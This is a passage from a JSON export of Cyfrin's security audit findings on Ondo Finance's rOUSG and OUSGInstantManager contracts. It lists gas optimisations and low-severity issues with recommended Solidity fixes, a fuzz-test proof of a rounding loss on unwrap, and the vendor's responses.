      "content": "**Description:** Change `ROUSG::unwrap` to return amount of `OUSG` output tokens then use that as input when calling `_redeem` in `OUSGInstantManager::redeemRebasingOUSG`:\n```solidity\nuint256 ousgAmountIn = rousg.unwrap(rousgAmountIn);\n\nusdcAmountOut = _redeem(ousgAmountIn);\n```\n\n**Ondo:**\nAcknowledged.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31357",
      "title": "In `OUSGInstantManager::_mint` and `_redeem` cache `feeReceiver` and only emit fee event if fees are deducted",
      "impact": "GAS",
      "content": "**Description:** In `OUSGInstantManager::_mint` cache `feeReceiver` and only emit fee event if fees are deducted to save 1 storage read:\n```solidity\n    // Transfer USDC\n    if (usdcFees > 0) {\n      // @audit GAS - cache `feeReceiver` and only emit fee event if\n      // fees are deducted\n      address feeReceiverCached = feeReceiver;\n\n      usdc.transferFrom(msg.sender, feeReceiverCached, usdcFees);\n      emit MintFeesDeducted(msg.sender, feeReceiverCached, usdcFees, usdcAmountIn);\n    }\n```\n\nA similar optimization can be made in `_redeem`.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31356",
      "title": "Remove return parameters from `rOUSG::_mintShares` and `_burnShares` as they are never read",
      "impact": "GAS",
      "content": "**Description:** Remove return parameters from `rOUSG::_mintShares` and `_burnShares` as they are never read. This saves 1 storage read in each function plus the cost of the return parameters.\n\n**Ondo:**\nFixed in commit [dc91728](https://github.com/ondoprotocol/rwa-internal/commit/dc91728630a47ba351150287e48547a405a1282e).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31355",
      "title": "In `InvestorBasedRateLimiter::_setAddressToInvestorId` use `delete` when setting to zero for gas refund",
      "impact": "GAS",
      "content": "**Description:** In `InvestorBasedRateLimiter::_setAddressToInvestorId` use `delete` when setting to zero:\n```solidity\n    // If the address is not being disassociated from all investors, increment the count\n    // for the investor the address is being associated with.\n    if (newInvestorId != 0) {\n      ++investorAddressCount[newInvestorId];\n\n      emit AddressToInvestorIdSet(\n        investorAddress,\n        newInvestorId,\n        investorAddressCount[newInvestorId]\n      );\n\n       // @audit move this here when setting a valid value\n       addressToInvestorId[investorAddress] = newInvestorId;\n    }\n    else {\n       // @audit use `delete` when setting to 0 for gas refund\n       delete addressToInvestorId[investorAddress];\n    }\n```\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31354",
      "title": "In `InvestorBasedRateLimiter::_setAddressToInvestorId` first read `addressToInvestorId[investorAddress]` then use it in the `if` statement check",
      "impact": "GAS",
      "content": "**Description:** In `InvestorBasedRateLimiter::_setAddressToInvestorId` first read `addressToInvestorId[investorAddress]` then use it in the `if` statement check to save 1 storage read:\n```solidity\n  function _setAddressToInvestorId(\n    address investorAddress,\n    uint256 newInvestorId\n  ) internal {\n    // @audit GAS - do this first then use it in `if` check to save 1 storage read\n    uint256 previousInvestorId = addressToInvestorId[investorAddress];\n\n    // prevents creating the same existing association\n    if (previousInvestorId == newInvestorId) {\n      revert AddressAlreadyAssociated();\n    }\n```\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31353",
      "title": "Refactor `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` to avoid performing unnecessary operations when creating a new investor",
      "impact": "GAS",
      "content": "**Description:** When creating a new investor inside `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` there is no need to do a lot of the current processing that occurs after the second `if` statement. A more optimized version could look like this:\n\n```solidity\n  function checkAndUpdateMintLimitOptimized(\n    address investorAddress,\n    uint256 mintAmount\n  ) external override onlyRole(CLIENT_ROLE) {\n    if (mintAmount == 0) {\n      revert InvalidAmount();\n    }\n\n    uint256 investorId = addressToInvestorId[investorAddress];\n\n    if (investorId == 0) {\n      // @audit GAS - for new investor, revert if `mintAmount > defaultMintLimit`\n      // otherwise execute next code then update investorIdToMintState[investorId].currentAmount\n      // and slightly change emitted event since prevAmount = 0\n      uint256 defaultMintLimitCache = defaultMintLimit;\n\n      if(mintAmount > defaultMintLimitCache) revert RateLimitExceeded();\n\n      // If this is a new investor, initialize their state with the default values\n      address[] memory addresses = new address[](1);\n      addresses[0] = investorAddress;\n\n      // @audit GAS - return new investorId from `_initializeInvestorState`\n      investorId = _initializeInvestorState(\n        addresses,\n        defaultMintLimit,\n        defaultRedemptionLimit,\n        defaultMintLimitDuration,\n        defaultRedemptionLimitDuration\n      );\n\n      // @audit now update current minted amount\n      investorIdToMintState[investorId].currentAmount = mintAmount;\n\n      // @audit and alter emitted event to reflect first mint for this new investor\n      emit MintStateUpdated(\n        investorAddress,\n        investorId,\n        0,\n        mintAmount,\n        defaultMintLimitCache - mintAmount\n      );\n    }\n    else {\n      // @audit GAS - wrap remaining code in an `else` to only\n      // execute if it wasn't a new investor\n      RateLimit storage mintState = investorIdToMintState[investorId];\n\n      uint256 prevAmount = mintState.currentAmount;\n      _checkAndUpdateRateLimitState(mintState, mintAmount);\n\n      emit MintStateUpdated(\n        investorAddress,\n        investorId,\n        prevAmount,\n        mintState.currentAmount,\n        mintState.limit - mintState.currentAmount\n      );\n    }\n  }\n```\nThe same optimization could be applied to `checkAndUpdateRedemptionLimit`.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31352",
      "title": "`InvestorBasedRateLimiter::_initializeInvestorState` should return newly created `investorId` to save re-reading it from storage",
      "impact": "GAS",
      "content": "**Description:** `InvestorBasedRateLimiter::_initializeInvestorState` should return the newly created `investorId`; this can then be used inside `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` to save 1 storage read in each function. For example take `checkAndUpdateMintLimit`:\n```solidity\n      _initializeInvestorState(\n        addresses,\n        defaultMintLimit,\n        defaultRedemptionLimit,\n        defaultMintLimitDuration,\n        defaultRedemptionLimitDuration\n      );\n\n      // @audit GAS - save 1 storage read by having _initializeInvestorState\n      // return the new `investorId`\n      investorId = addressToInvestorId[investorAddress];\n```\n\nThis can simply become:\n```solidity\ninvestorId = _initializeInvestorState(\n        addresses,\n        defaultMintLimit,\n        defaultRedemptionLimit,\n        defaultMintLimitDuration,\n        defaultRedemptionLimitDuration\n      );\n```\n\n**Ondo:**\nFixed in commit [192c7ca](https://github.com/ondoprotocol/rwa-internal/commit/192c7ca26e4aeab4c322ef6c4be0f39b5be5d34d).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31351",
      "title": "Avoid unnecessary initialization to zero",
      "impact": "GAS",
      "content": "**Description:** Avoid unnecessary initialization to zero:\n```solidity\nFile: contracts/ousg/InvestorBasedRateLimiter.sol\n\n253:     for (uint256 i = 0; i < addresses.length; ++i) {\n```\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n106:   uint256 public mintFee = 0;\n\n109:   uint256 public redeemFee = 0;\n\n881:     for (uint256 i = 0; i < exCallData.length; ++i) {\n```\n\n**Ondo:**\nFixed in commit [a7dab64](https://github.com/ondoprotocol/rwa-internal/commit/a7dab64a2ad87b6ca051c3aeb5371c8f9f933350).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31350",
      "title": "Cache storage variables in stack when read multiple times without being changed",
      "impact": "GAS",
      "content": "**Description:** Reading from storage is considerably more expensive than reading from the stack so cache storage variables when read multiple times without being changed:\n\n```solidity\nFile: contracts/ousg/InvestorBasedRateLimiter.sol\n\n// @audit cache these then use cache values when emitting event to save 2 storage reads\n324:      --investorAddressCount[previousInvestorId];\n335:      ++investorAddressCount[newInvestorId];\n\n// @audit cache and use cached value for check in L470 to save 1 storage read\n462:    if (mintState.lastResetTime == 0) {\n\n// @audit cache and use cached value for check in L506 to save 1 storage read\n498:    if (redemptionState.lastResetTime == 0) {\n```\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31349",
      "title": "Cache array length outside of loops and consider unchecked loop incrementing",
      "impact": "GAS",
      "content": "**Description:** Cache array length outside of loops and consider using `unchecked {++i;}` if not compiling with `solc --ir-optimized --optimize`:\n```solidity\nFile: contracts/ousg/InvestorBasedRateLimiter.sol\n\n253:     for (uint256 i = 0; i < addresses.length; ++i) {\n```\n\n```solidity\nFile: contracts/ousg/ousgInstantManager.sol\n\n881:     for (uint256 i = 0; i < exCallData.length; ++i) {\n```\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31348",
      "title": "`_assertUSDCPrice` breaks the solidity style guide",
      "impact": "LOW",
      "content": "**Description:** The `_assertUSDCPrice` function is public and starts with an underscore. According to the [solidity style guide](https://docs.soliditylang.org/en/latest/style-guide.html), this convention is suggested for non-external functions and state variables (private or internal).\n\n**Recommended Mitigation:** Remove the `_`, or change the visibility of the function.\n\n**Ondo:**\nFixed in commit [fc1c8fb](https://github.com/ondoprotocol/rwa-internal/commit/fc1c8fbd9efb77d4307611d83d7350d869a23e22).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31347",
      "title": "Consider allowing `ROUSG::burn` to burn dust amounts",
      "impact": "LOW",
      "content": "**Description:** `ROUSG::burn` is used by admins to burn `rOUSG` tokens from any account for regulatory reasons.\n\nIt does not allow burning a share amount smaller than 1e4, because this is less than a wei of `OUSG`.\n\n```solidity\nif (ousgSharesAmount < OUSG_TO_ROUSG_SHARES_MULTIPLIER)\n      revert UnwrapTooSmall();\n```\n\nDepending on the current and future regulatory situation it could be necessary to always be able to burn all shares from users.\n\n**Recommended Mitigation:** Consider allowing the `burn` function to burn all remaining shares even if under the minimum amount.\n\n**Ondo:**\nFixed in commit [2aa437a](https://github.com/ondoprotocol/rwa-internal/commit/2aa437aa78435fc4533c3a9d223460da34e71647).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31346",
      "title": "Misleading events are emitted when transferring a dust amount of rOUSG shares",
      "impact": "LOW",
      "content": "**Description:** Calling `ROUSG.transferShares` emits two events:\n\n`TransferShares`: How much rOUSG shares were transferred\n`Transfer`: How much rOUSG tokens were transferred\n\nCalling this function with a dust amount will emit an event that a non-zero amount of shares was transferred, together with an event that zero tokens were transferred as the `getROUSGByShares` will round to 0.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31345",
      "title": "Round up fees in `OUSGInstantManager::_getInstantMintFees` and `_getInstantRedemptionFees` to favor the protocol",
      "impact": "LOW",
      "content": "**Description:** Solidity rounds down by default so consider explicitly rounding up fees in `OUSGInstantManager::_getInstantMintFees` and `_getInstantRedemptionFees` to favor the protocol.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31344",
      "title": "Transfer tokens before minting shares in `rOUSG::wrap`",
      "impact": "LOW",
      "content": "**Description:** `rOUSG::wrap` [L411-413](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/rOUSG.sol#L411-L413) currently mints shares before transferring tokens used to mint those shares:\n```solidity\n// mint shares\nuint256 ousgSharesAmount = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n_mintShares(msg.sender, ousgSharesAmount);\n\n// transfer tokens used to mint the shares\nousg.transferFrom(msg.sender, address(this), _OUSGAmount);\n```\nA safer coding pattern is to transfer the tokens first then mint the shares.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31343",
      "title": "Reduce approval before transferring tokens in `rOUSG::transferFrom`",
      "impact": "LOW",
      "content": "**Description:** `rOUSG::transferFrom` [L286-289](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/rOUSG.sol#L286-L289) currently checks approvals, transfers the tokens then reduces the approvals:\n```solidity\n// verify approval\nrequire(currentAllowance >= _amount, \"TRANSFER_AMOUNT_EXCEEDS_ALLOWANCE\");\n\n// perform transfer\n_transfer(_sender, _recipient, _amount);\n\n// reduce approval\n_approve(_sender, msg.sender, currentAllowance - _amount);\n```\n\nA safer coding pattern is to reduce the approval first then transfer tokens similar to OpenZeppelin's [impementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L151-L152).\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31342",
      "title": "Consider implementing unlimited approvals for `rOUSG` token",
      "impact": "LOW",
      "content": "**Description:** ERC20 tokens commonly implement unlimited approvals by allowing users to approve spenders for `type(uint256).max`. Consider implementing this common feature; an [example](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L301-L311) from OpenZeppelin.\n\n**Ondo:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31341",
      "title": "Protocol may be short-changed by `BuidlRedeemer` during a USDC depeg event",
      "impact": "LOW",
      "content": "**Description:** `OUSGInstantManager::_redeemBUIDL` assumes that 1 BUIDL = 1 USDC as it [enforces](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/ousgInstantManager.sol#L453-L459) receiving 1 USDC for every 1 BUIDL it redeems:\n```solidity\nuint256 usdcBalanceBefore = usdc.balanceOf(address(this));\nbuidl.approve(address(buidlRedeemer), buidlAmountToRedeem);\nbuidlRedeemer.redeem(buidlAmountToRedeem);\nrequire(\n  usdc.balanceOf(address(this)) == usdcBalanceBefore + buidlAmountToRedeem,\n  \"OUSGInstantManager::_redeemBUIDL: BUIDL:USDC not 1:1\"\n);\n```\nIn the event of a USDC depeg (especially if the depeg is sustained), `BUIDLRedeemer` should return greater than a 1:1 ratio since 1 USDC would not be worth $1, hence 1 BUIDL != 1 USDC meaning the value of the protocol's BUIDL is worth more USDC. However `BUIDLReceiver` does not do this, it only ever [returns](https://etherscan.io/address/0x9ba14Ce55d7a508A9bB7D50224f0EB91745744b7#code) 1:1.\n\n**Impact:** In the event of a USDC depeg the protocol will be short-changed by `BuidlRedeemer` since it will happily receive only 1 USDC for every 1 BUIDL redeemed, even though the value of 1 BUIDL would be greater than the value of 1 USDC due to the USDC depeg.\n\n**Recommended Mitigation:** To prevent this situation the protocol would need to use an oracle to check whether USDC had depegged and if so, calculate the amount of USDC it should receive in exchange for its BUIDL. If it is short-changed it would either have to revert preventing redemptions or allow the redemption while saving the short-changed amount to storage then implement an off-chain process with BlackRock to receive the short-changed amount.\n\nAlternatively the protocol may simply accept this as a risk to the protocol that it will be willingly short-changed during a USDC depeg in order to allow redemptions to continue.\n\n**Ondo:**\nFixed in commits [408bff1](https://github.com/ondoprotocol/rwa-internal/commit/408bff112c39f393f67dde6c30a6addf3b221ee9), [8a9cae9](https://github.com/ondoprotocol/rwa-internal/commit/8a9cae9af5787f06db42b4224b147d60493e0133). We now use Chainlink USDC/USD Oracle and if USDC depegs below our tolerated minimum value both minting and redemptions will be stopped.\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31340",
      "title": "`ROUSG::unwrap` can unnecessarily return slightly less `OUSG` tokens than users originally wrapped",
      "impact": "LOW",
      "content": "**Description:** One invariant of the `ROUSG` token is:\n\n> when unwrapping users should receive the same amount of OUSG input tokens they provided when they wrapped, irrespective of price\n\nHowever this can often not be the case as `ROUSG::unwrap` can unnecessarily return slightly less `OUSG` tokens than users originally wrapped.\n\n**Impact:** Users will unnecessarily receive slightly less tokens than they originally wrapped, breaking an invariant of the `ROUSG` contract.\n\n**Proof of Concept:** Run this stand-alone stateless fuzz test which shows the problem:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.23;\n\nimport \"forge-std/Test.sol\";\n\n// run from base project directory with:\n// forge test --match-contract ROUSGWrapUnwrapBrokenInvariantTest -vvv\n\ncontract ROUSGWrapUnwrapBrokenInvariantTest is Test {\n\n    uint256 public constant OUSG_TO_ROUSG_SHARES_MULTIPLIER = 10_000;\n\n    function _getROUSGByShares(uint256 _shares, uint256 ousgPrice) internal pure returns (uint256 rOUSGAmount) {\n        rOUSGAmount = (_shares * ousgPrice) / (1e18 * OUSG_TO_ROUSG_SHARES_MULTIPLIER);\n    }\n\n    function getSharesByROUSG(uint256 _rOUSGAmount, uint256 ousgPrice)\n    internal pure returns (uint256 shares) {\n        shares = (_rOUSGAmount * 1e18 * OUSG_TO_ROUSG_SHARES_MULTIPLIER) / ousgPrice;\n    }\n\n    function _wrap(uint256 _OUSGAmount) internal pure returns (uint256 shares) {\n        require(_OUSGAmount > 0, \"rOUSG: can't wrap zero OUSG tokens\");\n\n        shares = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n    }\n\n    function _unwrap(uint256 _rOUSGAmount, uint256 ousgPrice) internal pure returns(uint256 tokens) {\n        require(_rOUSGAmount > 0, \"rOUSG: can't unwrap zero rOUSG tokens\");\n\n        uint256 ousgSharesAmount = getSharesByROUSG(_rOUSGAmount, ousgPrice);\n\n        vm.assume(ousgSharesAmount >= OUSG_TO_ROUSG_SHARES_MULTIPLIER);\n\n        tokens = ousgSharesAmount / OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n    }\n\n    function test_WrapUnwrapReturnsInputTokens(uint256 initialOUSGAmount, uint256 ousgPrice) external {\n        // bound inputs\n        initialOUSGAmount  = bound(initialOUSGAmount, 100000e18, type(uint128).max);\n        ousgPrice          = bound(ousgPrice, 105e18, 106e18);\n\n        // wrap OUSG into rOUSG\n        uint256 rousgShares = _wrap(initialOUSGAmount);\n\n        // get the token amount of rOUSG equivalent to the received shares\n        uint256 rousgAmount = _getROUSGByShares(rousgShares, ousgPrice);\n\n        // use the token amount to unwrap rOUSG back into OUSG\n        uint256 finalOUSGAmount = _unwrap(rousgAmount, ousgPrice);\n\n        // verify amounts match; this fails as user is slighty short-changed\n        assertEq(initialOUSGAmount, finalOUSGAmount);\n    }\n}\n```\n\n**Recommended Mitigation:** When calling `ROUSG::unwrap`, `burn` and `OUSGInstantManager::redeemRebasingOUSG`, instead of passing in the `ROUSG` token amount the callers should pass in the share amount which can be retrieved via `ROUSG::sharesOf`. The output token calculation can then be performed as `shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER` which will always return the correct amount of tokens.\n\nThe existing functions do not necessarily need to be removed but additional functions should be created to allow users to input the share amounts. The following function has been tested via an invariant fuzz testing suite and appears to always return the correct amount:\n```solidity\n  // @audit this function allow unwrapping by shares instead of tokens\n  // to prevent users being slightly short-changed such that users will\n  // always receive the same input amount of OUSG tokens\n  function unwrapShares(uint256 _shares) external whenNotPaused {\n    uint256 ousgTokens = _shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n\n    require(ousgTokens > 0, \"rOUSG: no tokens to send, unwrap more shares\");\n\n    uint256 rousgBurned = getROUSGByShares(_shares);\n\n    _burnShares(msg.sender, _shares);\n    ousg.transfer(msg.sender, ousgTokens);\n\n    emit Transfer(msg.sender, address(0), rousgBurned);\n    emit TransferShares(msg.sender, address(0), _shares);\n  }\n```\n\nProof that this mitigation works, using a modified version of the PoC stateless fuzz test:\n\nFirst ensure that `foundry.toml` has the fuzz setting increased for example:\n```\n[fuzz]\nruns = 1000000\n```\n\nThen run this stand-alone stateless fuzz test which verifies the solution:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.23;\n\nimport \"forge-std/Test.sol\";\n\n// run from base project directory with:\n// forge test --match-contract ROUSGWrapUnwrapFixedInvariantTest -vvv\n\ncontract ROUSGWrapUnwrapFixedInvariantTest is Test {\n\n    uint256 public constant OUSG_TO_ROUSG_SHARES_MULTIPLIER = 10_000;\n\n    function _wrap(uint256 _OUSGAmount) internal pure returns (uint256 shares) {\n        require(_OUSGAmount > 0, \"rOUSG: can't wrap zero OUSG tokens\");\n\n        shares = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n    }\n\n    function _unwrapShares(uint256 shares) internal pure returns(uint256 tokens) {\n        tokens = shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER;\n    }\n\n    function test_WrapUnwrapReturnsInputTokens(uint256 initialOUSGAmount, uint256 ousgPrice) external {\n        // bound inputs\n        initialOUSGAmount  = bound(initialOUSGAmount, 100000e18, type(uint128).max);\n        ousgPrice          = bound(ousgPrice, 105e18, 106e18);\n\n        // wrap OUSG into rOUSG\n        uint256 rousgShares = _wrap(initialOUSGAmount);\n\n        // use the token amount to unwrap rOUSG back into OUSG\n        uint256 finalOUSGAmount = _unwrapShares(rousgShares);\n\n        assertEq(initialOUSGAmount, finalOUSGAmount);\n    }\n}\n```\n\n**Ondo:**\nFixed in commits [df0e491](https://github.com/ondoprotocol/rwa-internal/commit/df0e491fb081f4b7cd0d7329f8763e644ea77c18), [2aa437a](https://github.com/ondoprotocol/rwa-internal/commit/2aa437aa78435fc4533c3a9d223460da34e71647). We decided on not making any changes to `OUSGInstantManager` due to the amount of code changes necessary.\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31339",
      "title": "`OUSGInstantManager` redemptions will be bricked if BlackRock deploys a new `BUIDLRedeemer` contract and sunsets the existing one",
      "impact": "LOW",
      "content": "**Description:** The `BUIDLRedeemer` contract is a very new contract; it is very possible that in the future a new version of the contract will be deployed and the current version will cease to function.\n\nTo future-proof `OUSGInstantManager` and ensure it will continue to function in this situation, remove the `immutable` keyword from the `buidlRedeemer` definition and add a setter function that allows it to be updated in the future.\n\n**Ondo:**\nIf a new `BUIDLRedeemer` contract is deployed our plan is to deploy a new `OUSGInstantManager`. We prefer to make it harder for us to change the address of `buidlRedeemer` to ensure there is proper due diligence of any changes.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-18-cyfrin-ondo-finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian"
      ]
    },
    {
      "id": "31338",
      "title": "`InstantMintTimeBasedRateLimiter::_setInstantMintLimit` and `_setInstantRedemptionLimit` can make subsequent calls to `_checkAndUpdateInstantMintLimit` and `_checkAndUpdateInstantRedemptionLimit` revert due to underflow",
      "impact": "LOW",
      "content": "**Description:** `InstantMintTimeBasedRateLimiter::_checkAndUpdateInstantMintLimit` [L103-106](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/InstantMintTimeBasedRateLimiter.sol#L103-L106) subtracts the currently minted amount from the mint limit:\n```solidity\nrequire(\n  amount <= instantMintLimit - currentInstantMintAmount,\n  \"RateLimit: Mint exceeds rate limit\"\n);\n```\n\nIf `_setInstantMintLimit` is used to set `instantMintLimit < currentInstantMintAmount`, subsequent calls to this function will revert due the underflow. The same is true for `_setInstantRedemptionLimit` and `_checkAndUpdateInstantRedemptionLimit`.\n\n**Impact:** `InstantMintTimeBasedRateLimiter::_setInstantMintLimit` and `_setInstantRedemptionLimit` can make subsequent calls to `_checkAndUpdateInstantMintLimit` and `_checkAndUpdateInstantRedemptionLimit` revert due to underflow.\n\n**Recommended Mitigation:** Explicitly handle the case where the limit is smaller than the current mint/redemption amount:\n```solidity\nfunction _checkAndUpdateInstantMintLimit(uint256 amount) internal {\n    require(\n      instantMintLimit > currentInstantMintAmount && amount <= instantMintLimit - currentInstantMintAmount,\n      \"RateLimit: Mint exceeds rate limit\"\n    );\n}\n\nfunction _checkAndUpdateInstantRedemptionLimit(uint256 amount) internal {\n    require(\n      instantRedemptionLimit > currentInstantRedemptionAmount && amount <= instantRedemptionLimit - 